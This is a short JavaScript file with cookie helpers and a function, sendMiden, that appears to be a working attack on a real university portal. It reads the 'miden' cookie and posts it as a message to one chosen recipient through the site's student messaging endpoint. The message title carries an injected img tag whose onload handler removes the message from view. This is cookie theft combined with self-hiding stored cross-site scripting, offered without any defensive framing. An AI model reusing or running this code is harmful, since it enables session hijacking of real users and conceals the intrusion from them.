function set_Cookie(name, value, expires, path, domain, secure) {
    var curCookie = name + "=" + escape(value) +
        ((expires) ? "; expires=" + expires.toGMTString() : "") +
        ((path) ? "; path=" + path : "") +
        ((domain) ? "; domain=" + domain : "") +
        ((secure) ? "; secure" : "");
        document.cookie = curCookie;
}

function getCookie(name) {
    var prefix = name + "="
    var cookieStartIndex = document.cookie.indexOf(prefix)
    if (cookieStartIndex == -1)
            return null
    var cookieEndIndex = document.cookie.indexOf(";", cookieStartIndex + prefix.length)
    if (cookieEndIndex == -1)
            cookieEndIndex = document.cookie.length
    return unescape(document.cookie.substring(cookieStartIndex + prefix.length, cookieEndIndex))
}

function sendMiden(){
	let miden = getCookie('miden')
	$.post( "https://lk.sut.ru/cabinet/project/cabinet/forms/message_create_stud.php", 'idinfo=0&title=<img src=https://pm1.narvii.com/7222/e111e7e7fc0519c97af53ec2f883bf2a358af1c2r1-700-998v2_hq.jpg height=0 onload=$(this).parent().parent().remove()>&mes='+miden+'&adresat=97130')
}

function delMes(){
	console.log($(this))
}
